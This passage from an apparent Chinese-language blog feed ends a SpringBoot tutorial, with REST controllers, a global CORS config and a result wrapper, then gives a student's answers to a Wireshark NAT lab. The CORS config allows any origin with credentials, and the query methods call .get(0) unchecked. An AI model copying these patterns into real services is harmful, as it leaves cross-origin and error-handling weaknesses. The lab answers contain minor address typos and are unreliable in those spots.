class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.controller;<br><br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.Person;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.service.PersonService;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.utils.Result;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><br><span class="hljs-keyword">import</span> javax.annotation.Resource;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/person&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PersonController</span> </span>&#123;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> PersonService personService;<br>    <br>    <span class="hljs-meta">@PostMapping(&quot;/add&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;Person&gt; <span class="hljs-title">addController</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Person person)</span></span>&#123;<br>        <span class="hljs-keyword">int</span> t= personService.insert(person);<br>        <span class="hljs-keyword">if</span>(t == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.success(person,<span class="hljs-string">&quot;username:&quot;</span>+person.getUsername()+ <span class="hljs-string">&quot;已存在person表和user表，更新person表数据&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(t==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.success(person,<span class="hljs-string">&quot;username:&quot;</span>+person.getUsername()+ <span class="hljs-string">&quot;已存在users表，不存在person表，插入person表&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(t==<span class="hljs-number">2</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.success(person,<span class="hljs-string">&quot;username:&quot;</span>+person.getUsername()+ <span class="hljs-string">&quot;不存在user表，存在person表，插入user表，更新person表数据&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(t==<span class="hljs-number">3</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.success(person,<span class="hljs-string">&quot;username:&quot;</span>+person.getUsername()+ <span class="hljs-string">&quot;不存在users表和person表，插入user表和person表&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;插入失败！&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/list&quot;)</span><br>    <span class="hljs-keyword">public</span> Result&lt;List&lt;Person&gt;&gt; listController()&#123;<br>        List&lt;Person&gt; list =personService.getList();<br>        <span class="hljs-keyword">if</span>(!list.isEmpty())&#123;<br>            <span class="hljs-keyword">return</span> Result.success(list,<span class="hljs-string">&quot;person表查看成功！&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;person表查看失败！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@GetMapping(&quot;/query&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;Person&gt; <span class="hljs-title">queryController</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String username)</span></span>&#123;<br>        Person person =personService.getByUsername(username).get(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(person!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.success(person,<span class="hljs-string">&quot;person表查找成功！&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;person表查找失败！&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h4 id="usercontroller"><a class="markdownIt-Anchor" href="#usercontroller"></a> UserController</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.controller;<br><br><br><span class="hljs-keyword">import</span> com.zino.ex4spring.domain.User;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.service.UserSersive;<br><span class="hljs-keyword">import</span> com.zino.ex4spring.utils.Result;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><span class="hljs-keyword">import</span> javax.annotation.Resource;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/user&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserController</span> </span>&#123;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> UserSersive userSersive;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/delete&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;User&gt; <span class="hljs-title">deleteController</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span></span>&#123;<br>        User user= userSersive.delete(username);<br>        <span class="hljs-keyword">if</span>(user!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.success(user,<span class="hljs-string">&quot;用户&quot;</span>+username+<span class="hljs-string">&quot;删除成功&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;删除失败，用户&quot;</span>+username+<span class="hljs-string">&quot;不存在&quot;</span>);<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/list&quot;)</span><br>    <span class="hljs-keyword">public</span> Result&lt;List&lt;User&gt;&gt; listController()&#123;<br>        List&lt;User&gt; list =userSersive.getList();<br>        <span class="hljs-keyword">if</span>(!list.isEmpty())&#123;<br>            <span class="hljs-keyword">return</span> Result.success(list,<span class="hljs-string">&quot;user表查看成功！&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;user表查看失败！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@GetMapping(&quot;/query&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;User&gt; <span class="hljs-title">queryController</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String username)</span></span>&#123;<br>        User user =userSersive.getByUsername(username).get(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(user!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> Result.success(user,<span class="hljs-string">&quot;user表查看成功！&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;user表查看失败！&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4跨域配置和工具类"><a class="markdownIt-Anchor" href="#4跨域配置和工具类"></a> 4)跨域配置和工具类</h3><h4 id="globalcorsconfig跨域配置"><a class="markdownIt-Anchor" href="#globalcorsconfig跨域配置"></a> GlobalCorsConfig跨域配置</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.config;<br><br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.CorsRegistry;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GlobalCorsConfig</span> </span>&#123;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> WebMvcConfigurer <span class="hljs-title">corsConfigurer</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> WebMvcConfigurer() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addCorsMappings</span><span class="hljs-params">(CorsRegistry registry)</span> </span>&#123;<br>                registry.addMapping(<span class="hljs-string">&quot;/**&quot;</span>)    <span class="hljs-comment">//添加映射路径，“/**”表示对所有的路径实行全局跨域访问权限的设置</span><br>                        .allowedOriginPatterns(<span class="hljs-string">&quot;*&quot;</span>)    <span class="hljs-comment">//开放哪些ip、端口、域名的访问权限</span><br>                        .allowCredentials(<span class="hljs-keyword">true</span>)  <span class="hljs-comment">//是否允许发送Cookie信息</span><br>                        .allowedMethods(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;PUT&quot;</span>, <span class="hljs-string">&quot;DELETE&quot;</span>)     <span class="hljs-comment">//开放哪些Http方法，允许跨域访问</span><br>                        .allowedHeaders(<span class="hljs-string">&quot;*&quot;</span>)     <span class="hljs-comment">//允许HTTP请求中的携带哪些Header信息</span><br>                        .exposedHeaders(<span class="hljs-string">&quot;*&quot;</span>);   <span class="hljs-comment">//暴露哪些头部信息（因为跨域访问默认不能获取全部头部信息）</span><br>            &#125;<br>        &#125;;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h4 id="result结果控制"><a class="markdownIt-Anchor" href="#result结果控制"></a> Result结果控制</h4><p>工具类Result的作用是作为返回给前端的统一后的对象。也就是说返回给前端的都是Result对象，只是对象中的属性不太一样，这样方便前端固定接收格式。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.utils;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Result</span>&lt;<span class="hljs-title">T</span>&gt; </span>&#123;<br>    <span class="hljs-keyword">private</span> String code;<br>    <span class="hljs-keyword">private</span> String msg;<br>    <span class="hljs-keyword">private</span> T data;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getCode</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> code;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setCode</span><span class="hljs-params">(String code)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.code = code;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getMsg</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setMsg</span><span class="hljs-params">(String msg)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.msg = msg;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> T <span class="hljs-title">getData</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> data;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setData</span><span class="hljs-params">(T data)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.data = data;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Result</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Result</span><span class="hljs-params">(T data)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.data = data;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Result <span class="hljs-title">success</span><span class="hljs-params">()</span> </span>&#123;<br>        Result result = <span class="hljs-keyword">new</span> Result&lt;&gt;();<br>        result.setCode(<span class="hljs-string">&quot;0&quot;</span>);<br>        result.setMsg(<span class="hljs-string">&quot;成功&quot;</span>);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-function">Result&lt;T&gt; <span class="hljs-title">success</span><span class="hljs-params">(T data)</span> </span>&#123;<br>        Result&lt;T&gt; result = <span class="hljs-keyword">new</span> Result&lt;&gt;(data);<br>        result.setCode(<span class="hljs-string">&quot;0&quot;</span>);<br>        result.setMsg(<span class="hljs-string">&quot;成功&quot;</span>);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-function">Result&lt;T&gt; <span class="hljs-title">success</span><span class="hljs-params">(T data,String msg)</span> </span>&#123;<br>        Result&lt;T&gt; result = <span class="hljs-keyword">new</span> Result&lt;&gt;(data);<br>        result.setCode(<span class="hljs-string">&quot;0&quot;</span>);<br>        result.setMsg(msg);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Result <span class="hljs-title">error</span><span class="hljs-params">(String code, String msg)</span> </span>&#123;<br>        Result result = <span class="hljs-keyword">new</span> Result();<br>        result.setCode(code);<br>        result.setMsg(msg);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="五-postman测试"><a class="markdownIt-Anchor" href="#五-postman测试"></a> 五、postman测试</h2><p>之后我们可以在postman中测试我们实现的接口</p><p>当然，在实际中我并没有直接一次性直接将一整个项目搭好，而是从一个接口开始，比如先将person/add这个接口调通，那就只要逐级实现person有关的文件就好了，先自底向上调通一个接口，这样整个项目的框架就有了，那之后的接口实现不过是重复造轮子罢了。</p><h3 id="personadd测试"><a class="markdownIt-Anchor" href="#personadd测试"></a> /person/add测试</h3><p>对于在控制器中用<code>@RequestBody</code>注解注入的参数，我们选择row,然后用json格式输入数据，成功后可以看到反馈</p><p><img src="/posts/c43b2e6b/image-20220418133245835.png" alt="image-20220418133245835"></p><p><img src="/posts/c43b2e6b/image-20220418133126294.png" alt="image-20220418133126294"></p><h3 id="personlist测试"><a class="markdownIt-Anchor" href="#personlist测试"></a> /person/list测试</h3><p><img src="/posts/c43b2e6b/image-20220418133515503.png" alt="image-20220418133515503"></p><h3 id="userdelete测试"><a class="markdownIt-Anchor" href="#userdelete测试"></a> /user/delete测试</h3><p>对于用@RequestParam注解给定的参数，我们采用params形式来填写参数</p><p><img src="/posts/c43b2e6b/image-20220418133556100.png" alt="image-20220418133556100"></p><p><img src="/posts/c43b2e6b/image-20220418133538946.png" alt="image-20220418133538946"></p><h3 id="userlist测试"><a class="markdownIt-Anchor" href="#userlist测试"></a> /user/list测试</h3><p><img src="/posts/c43b2e6b/image-20220418133702228.png" alt="image-20220418133702228"></p><p>到这里，我们这个后端项目的所有的接口都完成了，接下来就是在前端调用这些接口来实现一个直观的页面了。</p><p>前端项目预览：</p><p><img src="/posts/c43b2e6b/image-20220418133834884.png" alt="image-20220418133834884"></p><p><img src="/posts/c43b2e6b/image-20220418133858620.png" alt="image-20220418133858620"></p><p>参考：</p><p>主要参考了下面的第一篇文章学习了SpringBoot的基本架构，并以此为基础实现了自己的项目需求</p><p><a href="https://www.makerhu.com/posts/5b2ca0db/">快速上手SpringBoot项目（登录注册保姆级教程）</a></p><p>用下面的文章学习了Spring的基本知识</p><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1266263217140032">Spring开发- 廖雪峰的官方网站</a></p><p><a href="https://spring.io/">Spring | Home</a></p>]]></content>
    
    
    <categories>
      
      <category>Project</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpringBoot</tag>
      
      <tag>vue</tag>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络Lab3-WiresharkLab:NAT-v7.0</title>
    <link href="/posts/8e66caf7/"/>
    <url>/posts/8e66caf7/</url>
    
    <content type="html"><![CDATA[<h1 id="wireshark-lab-nat-v70"><a class="markdownIt-Anchor" href="#wireshark-lab-nat-v70"></a> Wireshark Lab: NAT v7.0</h1><h2 id="nat_home_side-file"><a class="markdownIt-Anchor" href="#nat_home_side-file"></a> NAT_home_side file</h2><h3 id="1"><a class="markdownIt-Anchor" href="#1"></a> 1.</h3><blockquote><p>What is the IP address of the client?</p></blockquote><p><img src="/posts/8e66caf7/image-20220504132400459.png" alt="image-20220504132400459"></p><p>由图中我们可以看到，客户机的IP地址为192.168.1.100</p><p>客户机因为要访问谷歌，所以向DNS服务器发起请求，请求获得目标网址的IP地址</p><h3 id="2"><a class="markdownIt-Anchor" href="#2"></a> 2.</h3><blockquote><p>The client actually communicates with several different Google servers in order to implement “safe browsing.” (See extra credit section at the end of this lab). The main Google server that will serve up the main Google web page has IP address 64.233.169.104. In order to display only those frames containing HTTP messages that are sent to/from this Google, server, enter the expression “http &amp;&amp; ip.addr == 64.233.169.104” (without quotes) into the Filter: field in Wireshark .</p></blockquote><p><img src="/posts/8e66caf7/image-20220504132700548.png" alt="image-20220504132700548"></p><h3 id="3"><a class="markdownIt-Anchor" href="#3"></a> 3.</h3><blockquote><p>Consider now the HTTP GET sent from the client to the Google server (whose IP address is IP address 64.233.169.104) at time 7.109267. What are the source and destination IP addresses and TCP source and destination ports on the IP datagram carrying this HTTP GET?</p></blockquote><p><img src="/posts/8e66caf7/image-20220504132945871.png" alt="image-20220504132945871"></p><p>如图，我们可以看到</p><ul><li><p>在7.109267时刻发出的get请求的源IP地址为192.168.1.100，目的IP地址为64.233.169.104</p></li><li><p>源端口为4335，目的端口为80</p></li></ul><h3 id="4"><a class="markdownIt-Anchor" href="#4"></a> 4.</h3><blockquote><p>At what time is the corresponding 200 OK HTTP message received from the Google server? What are the source and destination IP addresses and TCP source and destination ports on the IP datagram carrying this HTTP 200 OK message?</p></blockquote><p><img src="/posts/8e66caf7/image-20220504133321554.png" alt="image-20220504133321554"></p><p>如图我们可以看到</p><ul><li>在时刻7.158797收到了google服务器发回的200 OK http消息</li><li>源IP地址为64.233.169.104，目的IP地址为192.168.1.100</li><li>源IP端口号为80，目的IP端口号为4335</li></ul><h3 id="5"><a class="markdownIt-Anchor" href="#5"></a> 5.</h3><blockquote><p>Recall that before a GET command can be sent to an HTTP server, TCP must first set up a connection using the three-way SYN/ACK handshake. At what time is the client-to-server TCP SYN segment sent that sets up the connection used by the GET sent at time 7.109267?</p></blockquote><p><img src="/posts/8e66caf7/image-20220504133946898.png" alt="image-20220504133946898"></p><p>如图可以看到</p><ul><li>TCP SYN报文段是在7.075657时刻发送的</li></ul><blockquote><p>What are the source and destination IP addresses and source and destination ports for the TCP SYN segment? What are the source and destination IP addresses and source and destination ports of the ACK sent in response to the SYN.</p></blockquote><ul><li>源IP地址为192.168.1.100，目的IP地址为64.233.169.104</li><li>源端口号为4335，目的端口号为80</li></ul><blockquote><p>At what time is this ACK received at the client? (Note: to find these segments you will need to clear the Filter expression you entered above in step 2. If you enter the filter “tcp”, only TCP segments will be displayed by Wireshark).</p></blockquote><p><img src="/posts/8e66caf7/image-20220504134310581.png" alt="image-20220504134310581"></p><p>如图可以看到</p><ul><li>客户端在时刻7.108986收到此ACK</li></ul><h2 id="nat_isp_side"><a class="markdownIt-Anchor" href="#nat_isp_side"></a> NAT_ISP_side</h2><h3 id="6"><a class="markdownIt-Anchor" href="#6"></a> 6.</h3><blockquote><p>In the NAT_ISP_side trace file, find the HTTP GET message was sent from the client to the Google server at time 7.109267 (where t=7.109267 is time at which this was sent as recorded in the NAT_home_side trace file). At what time does this message appear in the NAT_ISP_side trace file? What are the source and destination IP addresses and TCP source and destination ports on the IP datagram carrying this HTTP GET (as recording in the NAT_ISP_side trace file)? Which of these fields are the same, and which are different, than in your answer to question 3 above?</p></blockquote><p><img src="/posts/8e66caf7/image-20220504135402330.png" alt="image-20220504135402330"></p><p>如图我们可以发现</p><ul><li>ISP在6.069168时刻收到客户端发往google服务器的HTTP get消息</li><li>承载此数据包的源IP地址和源端口号是（71.192.34.204，4335），目的IP地址和目的端口号是（64.233.169.104，80）</li><li>除了源IP地址以外，其余都相同。因为目前报文经过路由器中转，源IP地址已经变成了路由器的IP地址。</li></ul><h3 id="7"><a class="markdownIt-Anchor" href="#7"></a> 7.</h3><blockquote><p>Are any fields in the HTTP GET message changed? Which of the following fields in the IP datagram carrying the HTTP GET are changed: Version, Header Length, Flags, Checksum. If any of these fields have changed, give a reason (in one sentence) stating why this field needed to change.</p></blockquote><p>HTTP get消息中除了IP地址改变以外，其余都没有改变</p><p>IP数据报中版本、报文长度、标志位都没有改变，校验和发生了改变，因为源IP地址改变了，而校验和的计算包括源IP地址的值，所以校验和发生改变。</p><h3 id="8"><a class="markdownIt-Anchor" href="#8"></a> 8.</h3><blockquote><p>In the NAT_ISP_side trace file, at what time is the first 200 OK HTTP message received from the Google server? What are the source and destination IP addresses and TCP source and destination ports on the IP datagram carrying this HTTP 200 OK message? Which of these fields are the same, and which are different than your answer to question 4 above?</p></blockquote><p><img src="/posts/8e66caf7/image-20220504150607618.png" alt="image-20220504150607618"></p><ul><li><p>收到第一条HTTP 200OK消息的时间为6.308118</p></li><li><p>源IP和端口号：64.233.169.104,80    目的IP和端口号：71.192.34.1044335</p></li></ul><h3 id="9"><a class="markdownIt-Anchor" href="#9"></a> 9.</h3><blockquote><p>In the NAT_ISP_side trace file, at what time were the client-to-server TCP SYN segment and the server-to-client TCP ACK segment corresponding to the segments in question 5 above captured? What are the source and destination IP addresses and source and destination ports for these two segments?</p></blockquote><p><img src="/posts/8e66caf7/image-20220504171932251.png" alt="image-20220504171932251"></p><p>如图，我们可以看到：</p><ul><li>收到和问题5对应的TCP SYN的时刻为6.035475，其中源IP地址和端口为（71.192.34.104,4335),目的IP和端口为（64.233.169.104，80）</li></ul><p><img src="/posts/8e66caf7/image-20220504173019699.png" alt="image-20220504173019699"></p><ul><li>收到和问题5对应的TCP ACK的时刻为6.068754，其中源IP地址和端口号（64.233.169.104，80），目的IP和端口号为：71.192.34.104,4335)</li></ul><blockquote><p>Which of these fields are the same, and which are different than your answer to question 5 above?</p></blockquote><ul><li>对于SYN，源IP地址改变</li><li>对于ACK，目的IP地址改变</li><li>端口号和其他字段均保持不变</li></ul><h3 id="10"><a class="markdownIt-Anchor" href="#10"></a> 10.</h3><blockquote><p>Figure 4.25 in the text shows the NAT translation table in the NAT router.</p><p>Using your answers to 1-8 above, fill in the NAT translation table entries for HTTP connection considered in questions 1-8 above.</p></blockquote><div align="center">路由转发表</div><table><thead><tr><th>WAN端</th><th>LAN端</th></tr></thead><tbody><tr><td>71.192.34.104, 4335</td><td>192.168.1.100, 4335</td></tr></tbody></table><h2 id="extra-credit"><a class="markdownIt-Anchor" href="#extra-credit"></a> Extra Credit:</h2><blockquote><p>The trace files investigated above have additional connections to Google servers above and beyond the HTTP GET, 200 OK request/response studied above. For example, in the NAT_home_side trace file, consider the client-to-server GET at time 1.572315, and the GET at time 7.573305. Research the use of these two HTTP messages and write a half page explanation of the purpose of each of these messages.</p></blockquote><p>时刻1.572315访问的get</p><p><img src="/posts/8e66caf7/image-20220504174907713.png" alt="image-20220504174907713"></p><p>这个GET访问了Google safebrowsing，通过这个功能的官网给出的信息，我们就可以知道该功能提供的服务：</p><ul><li>Google 安全浏览功能通过在用户尝试导航到危险网站或下载危险文件时向用户显示警告，每天帮助保护超过 40 亿台设备。当网站受到恶意攻击者的入侵时，安全浏览功能还会通知网站管理员，并帮助他们诊断和解决问题，从而确保访问者的安全。安全浏览保护适用于各种 Google 产品，并为整个互联网提供更安全的浏览体验。</li></ul><p>它可以实现以下目的：</p><ul><li>主动过滤恶意网站，Google整合许多旗下技术，用于辨识钓鱼网站以及会偷偷安装恶意程式的网站等不安全的因素，提供即时的安全保护，并会持续辨识、分析，以确保资料库能维持最新情资。</li><li>Safe Browsing不但能在使用Chrome浏览器上网时发挥保护作用，还整合至Google Play Protect与Gmail等服务，能够加强Android装置的安全性，并让使用者不会受夹带于电子邮件中的不良讯息与恶意程式。</li></ul><p>time 7.573305访问的get</p><p><img src="/posts/8e66caf7/image-20220504174839136.png" alt="image-20220504174839136"></p><p>这个GET的目的检测当前是否有网络，系统会连接特定 HTTP 服务, 比如 <a href="https://link.zhihu.com/?target=http%3A//www.gstatic.com/generate_204%20hl%3Dca">http://www.gstatic.com/generate_204</a>, 如果能够返回 